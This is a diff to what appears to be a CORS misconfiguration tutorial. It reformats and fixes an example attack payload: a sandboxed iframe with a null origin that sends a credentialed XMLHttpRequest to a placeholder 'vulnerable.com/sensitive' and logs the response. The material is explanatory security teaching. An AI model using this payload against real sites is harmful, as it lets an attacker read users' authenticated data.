@@ -150,12 +150,14 @@ In this case, an attacker can use various tricks to generate a request containin
 
 ```html
 <iframe src="data:text/html" sandbox="allow-scripts allow-top-navigation allow-forms allow-same-origin">
-function reqlistener() { console.log(this.responseText) }
-var req = new XMLHttpRequest();
-req. = reqlistener();
-req.open("GET", 'vulnerable.com/sensitive', true);
-req.withCredentials = true;
-req.send();
+   function reqlistener() {
+      console.log(this.responseText)
+   }
+   var req = new XMLHttpRequest();
+   req.onload = reqlistener;
+   req.open("GET", 'vulnerable.com/sensitive', true);
+   req.withCredentials = true;
+   req.send();
 </iframe>
 ```
 
